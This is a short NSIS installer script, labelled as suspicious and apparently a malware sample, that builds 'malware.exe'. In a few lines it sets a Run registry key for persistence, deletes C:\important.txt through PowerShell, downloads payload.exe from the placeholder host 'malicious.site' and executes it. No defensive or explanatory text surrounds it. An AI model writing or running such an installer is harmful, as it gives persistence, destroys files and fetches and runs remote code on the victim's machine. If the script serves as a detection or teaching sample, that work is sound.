; A suspicious NSIS installer
Outfile "malware.exe"
Section
    WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Run" "MyMalware" "$EXEDIR\payload.exe"
    ExecWait 'powershell -command "Start-Sleep -Seconds 5; Remove-Item C:\important.txt"'
    DownloadFile "http://malicious.site/payload.exe" "$TEMP\payload.exe"
    ShellExec "open" "$TEMP\payload.exe"
SectionEnd
